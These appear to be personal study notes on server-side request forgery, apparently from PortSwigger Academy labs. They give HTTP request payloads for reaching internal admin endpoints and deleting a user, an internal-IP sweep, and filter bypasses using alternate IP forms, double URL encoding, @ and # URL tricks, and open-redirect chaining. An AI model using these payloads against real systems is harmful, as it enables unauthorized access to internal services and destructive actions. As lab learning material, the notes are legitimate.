# Server-side request forgery (SSRF)
In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems. 
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
# OR
stockApi=http%3a//localhost/admin/delete?username=carlos
```
### SSRF attacks against other back-end systems
Used burpsuite intruder for find out other ip in target network
```
POST /product/stock HTTP/2
Host: 0ab800a2041cbd48824a398300980027.web-security-academy.net
Cookie: session=MtRrRrixUYb0rcXQ212Fcow3mLo4dX7Q
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:156.0) Gecko/20100101 Firefox/156.0
Accept: */*

stockApi=http%3a//192.168.0.$X$:8080/admin
```
### SSRF with blacklist-based input filters
Some applications block input containing hostnames like `127.0.0.1` and `localhost`, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using the following techniques:
- Use an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`.
- Register your own domain name that resolves to `127.0.0.1`. You can use `spoofed.burpcollaborator.net` for this purpose.
- Obfuscate blocked strings using URL encoding or case variation.
- Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an `http:` to `https:` URL during the redirect has been shown to bypass some anti-SSRF filters.
- Double URL encoder
- Only one letter doble URL encoder
```bash
stockApi=http://127.1/admin/delete?username=carlos
# double url encoder 'a'
stockApi=http://127.1/%25%36%31dmin/delete?username=carlos
```
### SSRF with whitelist-based input filters
The URL specification contains a number of features that are likely to be overlooked when URLs implement ad-hoc parsing and validation using this method:
- You can embed credentials in a URL before the hostname, using the `@` character. For example:
    `https://expected-host:fakepassword@evil-host`
- You can use the `#` character to indicate a URL fragment. For example:
    `https://evil-host#expected-host`
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
    `https://expected-host.evil-host`
- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try [double-encoding](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-double-url-encoding) characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.
- You can use combinations of these techniques together.
```
https://evil-host@expected-host
https://localhost/@expected-host/admin/............
http%3A%2F%2F%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34%25%32%66@stock.weliketoshop.net/admin/delete?username=carlos
```
### Bypassing SSRF filters via open redirection
You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```
This SSRF exploit works because the application first validates that the supplied `stockAPI` URL is on an allowed domain, which it is. The application then requests the supplied URL, which triggers the open redirection. It follows the redirection, and makes a request to the internal URL of the attacker's choosing.

```bash
/product/stock/check?productId=2&storeId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos
# /nextProduct find out othe endpoint
stockApi=/product/nextProduct?currentProductId=3%26path=http://192.168.0.12:8080/admin/delete?username=carlos
```


_[A new era of SSRF](https://portswigger.net/blog/top-10-web-hacking-techniques-of-2017#1)_
